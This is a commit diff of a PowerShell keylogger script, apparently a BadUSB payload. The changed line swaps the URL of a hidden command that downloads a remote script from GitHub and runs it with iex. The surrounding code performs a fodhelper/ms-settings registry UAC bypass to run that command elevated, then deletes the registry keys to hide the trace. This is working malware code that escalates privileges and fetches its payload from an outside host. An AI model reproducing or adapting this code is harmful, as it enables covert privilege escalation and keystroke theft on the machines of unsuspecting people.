1f7b39b2f1b97d26d3634d48211fff0dfdca1cbb
legiac <121451323+legiac@users.noreply.github.com>
2022-12-28 13:38:53 +0100

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -33,7 +33,7 @@ function s1 {
 	$user = "$env:COMPUTERNAME\$env:USERNAME"
 	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
 if($isAdmin){
-	$259="powershell.exe -w h iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Keylogger/s2.ps1 -UseBasicParsing | iex";
+	$259="powershell.exe -w h iwr https://raw.githubusercontent.com/legiac/bu/main/s2.ps1 -UseBasicParsing | iex";
 	reg add "HKCU\Software\Classes\.259\Shell\Open\command" /d $259 /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".259" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.259\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;
 
 	}
